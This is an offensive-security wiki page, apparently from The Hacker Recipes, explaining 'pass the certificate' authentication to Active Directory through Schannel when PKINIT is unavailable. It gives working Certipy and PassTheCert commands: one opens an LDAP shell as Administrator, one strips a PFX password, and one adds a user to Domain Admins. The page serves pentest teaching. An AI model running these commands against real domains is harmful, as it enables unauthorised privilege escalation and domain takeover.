# Pass the Certificate - Schannel

## Theory

In cases where a Domain Controller does not support [PKINIT](../../../ad/movement/kerberos/pass-the-certificate.md), you may encounter the **`KDC_ERR_PADATA_TYPE_NOSUPP`** error when trying to authenticate. For a KDC to support PKINIT, its certificates must include the **`Smart Card Logon`** EKU.

Fortunately, we can still use [Schannel SSP (Security Service Provider)](https://learn.microsoft.com/en-us/windows-server/security/tls/tls-ssl-schannel-ssp-overview) to authenticate ourselves using a certificate. Schanel is the SSL/TLS implementation from Microsoft in Windows and can be used to authenticate servers and clients and then use the protocol to encrypt messages between the authenticated parties. **Several protocols including LDAP support it**.

{% hint style="success" %}
* Schannel authentication relies on TLS so it is, by design, not subject to channel binding, as the authentication is borne by TLS itself.
* Schannel is not subject to LDAP signing either as the `bind` is performed after a StartTLS command when used on the LDAP TCP port.
{% endhint %}

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
Authentication via Schannel is supported by [Certipy](https://github.com/ly4k/Certipy). lt will open a connection to LDAPS and drop into an interactive shell with limited LDAP commands

```bash
certipy auth -pfx <PATH_TO_PFX_CERT> -username <user> -domain <DOMAIN_FQDN> -ldap-shell -ldap-scheme ldaps -dc-ip $DC_IP
[*] Connecting to 'ldaps://10.10.10.10:636'
[*] Authenticated to '10.10.10.10' as: u:CONTOSO.LOCAL\Administrator
Type help for list of commands

# help
```

{% hint style="info" %}
Notes that Certipy's commands don't support PFXs with password. The following command can be used to "unprotect" a PFX file.

```bash
certipy cert -export -pfx <PATH_TO_PFX_CERT> -password <CERT_PASSWORD> -out <unprotected.pfx>
```
{% endhint %}
{% endtab %}

{% tab title="Windows" %}
Pass the certificate trough Schannel can be done with [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) (C# version).&#x20;

```powershell
# Add simple_user to Domain Admins (it assumes that the domain account for which the certificate was issued, holds privileges to add user to this group)
.\PassTheCert.exe --server fqdn.domain.local --cert-path Z:\cert.pfx --add-account-to-group --target "CN=Domain Admins,CN=Users,DC=domain,DC=local" --account "CN=simple_user,CN=Users,DC=domain,DC=local"
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.thehacker.recipes/ad/movement/schannel/passthecert" %}
